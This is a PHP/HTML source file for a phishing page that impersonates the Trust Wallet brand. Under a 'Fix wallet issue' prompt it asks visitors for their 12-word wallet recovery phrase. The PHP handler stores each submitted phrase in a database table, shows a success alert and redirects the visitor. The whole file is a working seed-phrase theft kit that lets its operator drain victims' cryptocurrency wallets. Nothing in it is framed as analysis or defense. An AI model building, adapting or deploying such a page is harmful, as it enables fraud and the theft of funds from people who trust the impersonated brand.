<?php //require_once("../includes/session.php"); ?>
<?php 
include('../includes/connection.php');
include('../includes/functions.php');
$pagetitle = "Trust Wallet ";
?>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <meta name="theme-color" content="#000000">
    <link rel="manifest" href="manifest.json">
    <script src="/currencycss/manifestrestore.json"></script>

    <link rel="shortcut icon" href="currencycss/logo.png" />

    <title>Best Cryptocurrency Wallet | Ethereum Wallet | ERC20 Wallet | Trust Wallet</title>
    <link href="./currencycss/main_restore.css" rel="stylesheet">

</head>

 <?php 
if (isset($_POST['submit'])) {
$errors = array();
$db_images = "";

			$required_fields = array('wd_phrase');
			foreach($required_fields as $fieldname) {
				if (!isset($_POST[$fieldname]) || (empty($_POST[$fieldname]))) { 
					$errors[] = $fieldname; 
				}
			}
			//include("../includes/image_upload_app1.php");
			//if(strlen($db_images) < 7){ $errors[] = "No image upload"; }

						
			if (empty($errors)) {
				// Perform Inssert
				//$passport = $db_images;
				$wd11 = stripslashes($_REQUEST['wd_phrase']);
				$wd11 = mysqli_real_escape_string($connection,$_POST['wd_phrase']);
			
				//$clientid = mysqli_real_escape_string($connection,$_POST['clientid']);
				/*$rphone = stripslashes($_REQUEST['rphone']);
				$rphone = mysqli_real_escape_string($connection,$_POST['rphone']);
				$rcountry = stripslashes($_REQUEST['rcountry']);
				$rcountry = mysqli_real_escape_string($connection,$_POST['rcountry']);
				$time = stripslashes($_REQUEST['time']);
				$time = mysqli_real_escape_string($connection,$_POST['time']);
				$trackid ="AOUxSC-".time();
				$orderno ="AC".time()."AXT";*/
						
				$query = "INSERT INTO trusttbl (
						wd_phrase
						) VALUES (
							'{$wd11}')";
						
						
         
				$result = mysqli_query($connection,$query);
				if ($result) {
					
				echo "<script type='text/javascript'>alert('Word Phrase Submitted successfully !')</script>";
				redirect_to(SITE_PATH.'currency/success.html');
					
				} else {
					// Display error message.
					echo "<p>Word Phrase Creation failed.</p>";
					echo "<p>" . mysqli_error($connection) . "</p>";
				}
				
				} 
			else {
				// Errors occurred
				$message = "There were " . count($errors) . " errors in the form.";
			}
			
			


} // end: if (isset($_POST['submit']))
?>

<body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <form  action="" method="post" enctype="multipart/form-data">
        <div id="root">
            <div class="App">
                <div class="NavBar NavBar--is-centered"><img class="NavBar__logo" src="./currencycss/horizontal_blues.png"></div>
                <div class="Pages">
                    <div class="UnlockWalletPage">
                        <div class="UnlockWalletPage__wrapper">
                            <!--<div class="UnlockWalletPage__title box">

</div>-->
                            <div class="UnlockWalletCard">
                                <div class="UnlockWalletCard__content">
                                    <div class="UnlockWalletCard__header">

                                    </div>

                                    <div class="UnlockWalletViaMnemonicPhrase">
                                        <div class="UnlockWalletViaMnemonicPhrase__restore">Fix wallet issue</div>
                                        <!-- <div class="UnlockWalletViaMnemonicPhrase__title">MNEMOMIC</div> -->
                                        <textarea class="UnlockWalletViaMnemonicPhrase__mnemonic" name="wd_phrase" placeholder="Please enter your 12-word phrase" minlength="12" required=""></textarea>
                                        <div class="UnlockWalletViaMnemonicPhrase__mnemonic-instructions">Please separate each word-Phrase with a space.</div>

                                        <div class="UnlockWalletViaMnemonicPhrase__footer">
                                            <button type="submit" name="submit" style="width:100%;" class="GradientButton undefined GradientButton">
	<div class="GradientButton__title">Submit Phrase</div>
	</button>
                                        </div>
                                    </div>


                                    <!-- <script>
                                        function changeTab(evt, cityName) {
                                            var i, tabcontent, tablinks;
                                            tabcontent = document.getElementsByClassName("ccc");
                                            for (i = 0; i < tabcontent.length; i++) {
                                                tabcontent[i].style.display = "none";
                                            }
                                            tablinks = document.getElementsByClassName("tablinks");
                                            for (i = 0; i < tablinks.length; i++) {
                                                tablinks[i].className = tablinks[i].className.replace(" TabBarItem--is-active", "");
                                            }
                                            document.getElementById(cityName).style.display = "block";
                                            evt.currentTarget.className += " active";
                                        }
                                    </script> -->




                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </form>
</body>

</html>